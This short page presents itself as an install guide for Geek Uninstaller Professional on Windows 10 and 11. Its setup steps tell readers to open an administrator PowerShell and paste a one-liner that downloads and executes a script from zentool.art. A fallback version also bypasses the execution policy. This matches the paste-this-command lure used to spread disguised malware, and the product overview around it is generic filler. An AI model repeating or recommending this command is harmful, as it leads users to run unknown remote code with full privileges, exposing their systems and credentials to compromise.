# Geek Uninstaller Professional — Windows Desktop Utility Guide (10 & 11)

Windows 10 & 11 · system management · desktop utility.

**Geek Uninstaller Professional** on **Windows 10 and 11** — system management and day-to-day notes for windows power users and administrators.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **Geek Uninstaller Professional** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Geek Uninstaller is a lightweight alternative for removing desktop software and forcing cleanup when the built-in Programs list fails. It highlights install dates, sizes, and publisher paths for quick audits.

Use it to remove bloatware on new laptops, strip conflicting versions before upgrades, and confirm that no service entries remain. Notes cover portable vs installed modes where applicable, and post-removal reboot guidance.
